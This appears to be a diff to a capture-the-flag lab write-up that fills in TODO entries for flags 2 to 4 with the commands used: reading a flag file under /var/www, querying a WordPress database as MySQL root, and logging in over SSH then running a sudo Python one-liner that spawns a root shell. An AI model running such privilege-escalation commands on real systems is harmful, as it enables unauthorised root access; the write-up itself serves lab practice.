@@ -48,12 +48,22 @@ grep -r flag
   - `flag2{fc3fd58dcdad9ab23faca6e9a36e581c}`: 
     - **Exploit Used**
       - _TODO: Identify the exploit used_
-      - _TODO: Include the command run_
+```
+cd /var/www
+cat flag.txt
+```
   - `flag3{afc01ab56b50591e7dccf93122770cd2}`: 
     - **Exploit Used**
       - _TODO: Identify the exploit used_
-      - _TODO: Include the command run_
+```
+mysql -u root -p
+use wordpress
+select * from wp_posts
+```
   - `flag4{715dea6c055b9fe3337544932f2941ce}`: 
     - **Exploit Used**
       - _TODO: Identify the exploit used_
-      - _TODO: Include the command run_
+```
+ssh steven@192.168.110
+sudo python -c 'import pty;pty.spawn("/bin/bash");'
+```
